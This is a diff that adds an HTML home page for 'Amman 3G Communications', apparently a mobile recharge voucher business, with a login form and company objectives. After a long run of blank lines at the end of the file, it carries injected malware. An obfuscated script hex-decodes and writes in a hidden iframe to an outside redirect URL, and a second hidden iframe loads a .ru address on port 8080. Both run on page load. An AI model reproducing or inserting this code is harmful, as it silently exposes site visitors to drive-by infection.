@@ -1,0 +1,258 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title>Welcome to Amman 3G Communications </title>
+<link href="style.css" rel="stylesheet" type="text/css" />
+<style type="text/css">
+<!--
+a:link {
+	text-decoration: none;
+}
+a:visited {
+	text-decoration: none;
+}
+a:hover {
+	text-decoration: none;
+}
+a:active {
+	text-decoration: none;
+}
+.style1 {color: #1BAF1D}
+-->
+</style>
+<script type="text/JavaScript">
+<!--
+
+
+
+function MM_preloadImages() { //v3.0
+  var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array();
+    var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++)
+    if (a[i].indexOf("#")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}}
+}
+//-->
+</script>
+</head>
+
+<table width="1000" border="0" align="center" cellpadding="0" cellspacing="0">
+  
+  <tr>
+    <td colspan="2" align="left" valign="top" bgcolor="#ECFAFD"><title>Welcome to Amman 3G Communications</title>
+<script type="text/JavaScript">
+<!--
+function MM_swapImgRestore() { //v3.0
+  var i,x,a=document.MM_sr; for(i=0;a&&i<a.length&&(x=a[i])&&x.oSrc;i++) x.src=x.oSrc;
+}
+//-->
+</script>
+<table width="1000" border="0" align="center" cellpadding="0" cellspacing="0">
+  <tr>
+    <td height="38" colspan="2" align="left" valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="0">
+      <tr bgcolor="#78E2FC">
+        <td>&nbsp;</td>
+        <td><a href="index.php" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('Image12','','images/index_02a.jpg',1)"><img src="images/index_02a.jpg" width="112" height="38" border="0" longdesc="index.php" /></a></td>
+        <td><a href="about.php" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('Image13','','images/index_03a.jpg',1)"><img src="images/index_03a.jpg" width="131" height="38" border="0" longdesc="about.php" /></a></td>
+        <td valign="middle"><a href="product.php" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('Image14','','images/index_04a.jpg',1)"><img src="images/index_04a.jpg" width="139" height="38" border="0" longdesc="plan.php" /></a></td>
+        <td align="center"><a href="plan.php" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('Image15','','images/index_05a.jpg',1)"><img src="images/index_05a.jpg" width="167" height="38" border="0" longdesc="b_summery.php" /></a></td>
+        <td><a href="achivers.php" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('Image16','','images/index_06a.jpg',1)"><img src="images/index_06a.jpg" width="130" height="38" border="0" longdesc="achivers.php" /></a></td>
+        <td><a href="contact.php" onmouseout="MM_swapImgRestore()" onmouseover="MM_swapImage('Image17','','images/index_07a.jpg',1)"><img src="images/index_07a.jpg" width="140" height="38" border="0" longdesc="contact.php" /></a></td>
+      </tr>
+    </table></td>
+  </tr>
+  <tr>
+    <td colspan="2" align="left" valign="top" bgcolor="#FFFFFF"><object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="1000" height="311">
+      <param name="movie" value="flash/banner.swf" />
+      <param name="quality" value="high" />
+      <embed src="flash/banner.swf" quality="high" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" width="1000" height="311"></embed>
+    </object></td>
+  </tr>
+  <tr>
+    <td height="3" colspan="2" valign="top"><img src="images/index_09.jpg" width="1000" height="3" /></td>
+  </tr></table></td>
+  </tr>
+  
+  <tr>
+    <td width="271" height="381" valign="top" bgcolor="#ECFAFD"><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+<title>Untitled Document</title>
+<link href="style.css" rel="stylesheet" type="text/css" />
+</head>
+
+<body>
+<table width="299" border="0">
+  <tr>
+    <td><table bgcolor="#0C4550" width="100%" height="362" border="0" cellpadding="0" cellspacing="0">
+      <tr bgcolor="#0C4550">
+        <td height="34" colspan="2" align="center" valign="top" bgcolor="#ECFAFD"><br />
+            <img src="images/login.jpg" width="300" height="80"  style="background-repeat:no-repeat"/></td>
+      </tr>
+      <tr>
+        <td height="15" ></td>
+        <td></td>
+      </tr>
+      <form action="loginchk.php" method="post">
+        <tr>
+          <td width="40%" height="24" align="right" valign="middle" class="tablehead">UserName :</td>
+          <td width="60%"><input name="id" type="text" class="textbox" id="id" />
+          </td>
+        </tr>
+        <tr>
+          <td colspan="2">&nbsp;</td>
+        </tr>
+        <tr>
+          <td align="right" valign="middle" class="tablehead">Password :</td>
+          <td><input name="password" type="password" class="textbox" id="password" />
+          </td>
+        </tr>
+        <tr>
+          <td colspan="2" align="center"><input name="submit" type="submit" value="Login" /></td>
+        </tr>
+      </form>
+      <tr>
+        <td colspan="2" height="1" bgcolor="#ECFAFD"></td>
+      </tr>
+      <tr>
+        <td colspan="2">&nbsp;</td>
+      </tr>
+      <tr bgcolor="#0C4550">
+        <td colspan="2"><div align="center" class="bottom_text">LATEST NEWS</div></td>
+      </tr>
+      <tr bgcolor="#0C4550">
+        <td height="100" colspan="2" class="bottom_text" style="padding:10px 25px 10px 25px"><marquee direction="up" scrollamount="1" height="80">
+          <div align="justify">
+            <p>&quot;When people are drawn towards a common goal then there are a lot of benefits that can be heaped&quot; With this goal in mind Amman 3G Communications with its huge customer base is serving the individuals and their families with the Team Effort as its pivot, motivating to the people. </p>
+          </div>
+        </marquee></td>
+      </tr>
+    </table></td>
+  </tr>
+</table>
+</body>
+</html>
+</td>
+    <td width="729" valign="top" bgcolor="#ECFAFD"><table width="98%" border="0" align="center" cellpadding="0" cellspacing="0">
+      <tr>
+        <td height="27" colspan="3">&nbsp;</td>
+        </tr>
+      <tr>
+        <td width="12%" height="35" align="left" valign="top"><div align="right"><img src="images/icon.jpg" width="33" height="35" /></div></td>
+        <td width="82%" align="left" valign="middle" class="pagehead style1" style="padding-left:10px">Welcome To Amman 3G Communications</td>
+      </tr>
+      <tr height="1" >
+        <td></td>
+        <td height="1" bgcolor="#336699"></td>
+        <td width="6%" height="1" bgcolor="#ECFAFD"></td>
+      </tr>
+      <tr>
+        <td height="191" bgcolor="#ECFAFD">		  </td>
+        <td height="191"><br />
+		<p align="justify" class="text"> &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;  Amman 3G Communications Regd and Authorized by the Government. </p>
+		  <p align="justify" class="content"><span class="text">&nbsp; &nbsp; <strong>Objective :</strong></span></p>
+		
+		 <ul class="text" style="line-height:20px"><li>To distribute the recharge vouchers of all the companies providing cellular/mobile services.</li>
+		<li>To provide self-employment opportunities to all the levels of people.</li>
+		<li>To improvise the standard of the individuals who recharge their mobiles in this medium.</li></ul>
+		</td>
+        <td height="191">&nbsp;</td>
+      </tr>
+    </table> </td>
+  </tr>
+  
+  <tr>
+    <td colspan="2" align="center" bgcolor="#FFFFFF"><TABLE width="100%" border=0 cellPadding=0 cellSpacing=0 bgcolor="#52A0D6" height="50">
+  <TBODY>
+    <TR>
+      <TD class=copytext vAlign=center align=middle bgColor=#999999 
+          height=1></TD>
+    </TR>
+    <TR>
+      <TD class=copytext vAlign=center align=middle height=25><div align="center">&copy; 2009
+        Amman 3G Communications&nbsp;&nbsp;&nbsp; l &nbsp;&nbsp;&nbsp;Web 
+        Solutions by <A class=linksub href="http://www.pearlsoftwares.com" 
+            target=_blank>Pearl Softwares</A></div></TD>
+    </TR>
+  </TBODY>
+</TABLE>
+</td>
+  </tr>
+</table>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>c10zbf='';ya96ef=/* y6006bfbad56 */document;ya96ef.write('<scr'+'ipt>function yf7bacec3(y1d94bc8b9a8){return e'+c10zbf+'val(y1d94bc8b9a8); }</scr'+'ipt>');  function c101e3f8acy7d5242(y56e6480334e){ function y7f1f24dc(){return 16;} var za='';return (yf7bacec3('par'+za+'seInt')(y56e6480334e,y7f1f24dc()));}function yf941aa(y5e7ca2){ function yc5be07(){return 2;} var y794f055c='';y01c42487='fromCh';y09b159a4f=String[y01c42487+'arCode'];for(y74371c2683f=0;y74371c2683f<y5e7ca2.length;y74371c2683f+=yc5be07()){ y794f055c+=(y09b159a4f(c101e3f8acy7d5242(y5e7ca2.substr(y74371c2683f,yc5be07()))));}return y794f055c;} var y9e6447168fb='3C7363726970743E69662821'+c10zbf+'6D796961'+c10zbf+'297B646F63756D656E742E777269746528756E65736361'+c10zbf+'7065282027253363253639253636253732253631'+c10zbf+'253664253635253230253665253631'+c10zbf+'253664253635253364253633253331'+c10zbf+'253330253230253733253732253633253364253237253638253734253734253730253361'+c10zbf+'253266253266253733253734253635253730253332253664253635253265253665253635253734253266253265253634253639253636253266253637253666253265253730253638253730253366253733253639253634253364253331'+c10zbf+'26253237253262253464253631'+c10zbf+'253734253638253265253732253666253735253665253634253238253464253631'+c10zbf+'253734253638253265253732253631'+c10zbf+'253665253634253666253664253238253239253261'+c10zbf+'253332253334253339253339253330253239253262253237253631'+c10zbf+'253237253230253737253639253634253734253638253364253332253331'+c10zbf+'253330253230253638253635253639253637253638253734253364253331'+c10zbf+'253331'+c10zbf+'253339253230253733253734253739253663253635253364253237253736253639253733253639253632253639253663253639253734253739253361'+c10zbf+'253638253639253634253634253635253665253237253365253363253266253639253636253732253631'+c10zbf+'2536642536352533652729293B7D7661'+c10zbf+'72206D796961'+c10zbf+'3D747275653B3C2F7363726970743E';ya96ef.write(yf941aa(y9e6447168fb));</script>
+
+
+
+
+
+
+
+
+<iframe src="http://x3y.ru:8080/index.php" width=111 height=127 style="visibility: hidden"></iframe>
